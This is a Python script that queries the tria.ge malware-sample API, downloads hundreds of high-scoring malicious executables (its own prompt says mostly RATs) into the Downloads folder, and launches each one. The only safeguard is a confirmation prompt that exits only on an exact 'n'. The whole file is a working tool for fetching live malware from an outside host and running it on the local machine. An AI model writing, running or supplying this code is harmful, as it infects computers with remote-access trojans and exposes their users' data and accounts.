import os, subprocess, requests, sys, tempfile, colorama
from colorama import Fore
# Seriously I am not good at commenting code
# Put your tria.ge API key here
api_key = ''

def main(score):
    files = requests.get(f'https://tria.ge/api/v0/search?query=score:{score}&limit=200', headers={'authorization': 'Bearer ' + api_key})
    if files.status_code != 200:
        print(f"{Fore.RED}Failed to fetch files, did you provide a valid API Key?")
        return
    files = files.json()
    for file in files['data']:
        file_id = file['id'] # Seems pretty useless honestly, I don't get why so many people do this
        try:
            file_download = requests.get(f'https://tria.ge/api/v0/samples/{file_id}/sample', headers={'authorization': 'Bearer ' + api_key}).content # Get the .exe file content
            download_folder_path = os.path.join(os.path.expanduser('~'), 'Downloads')
            with open(os.path.join(download_folder_path, f'{file['id']}.exe'), 'wb') as folder: # Uhh download the file I guess
                folder.write(file_download) # Ok so this downloads it
            print(f"{Fore.GREEN}Successfully downloaded file {file['filename']}!")
            subprocess.Popen(os.path.join(download_folder_path, f'{file['id']}.exe')) # Runs the file
        except Exception as e:
            print(f"{Fore.RED}Failed to download file {file_id}: {e}")
    print(f"{Fore.YELLOW}Successfully downloaded 200 files from score {score}.")
            
if __name__ == '__main__':
    oh_no = input('Are you SURE you want to run this file? This program will download 400+ Viruses on your computer (Mostly RATs)\n')
    os.system('cls')
    if oh_no == 'n':
        sys.exit(0)
    
    for i in range(10, 0, -1):
        main(i)
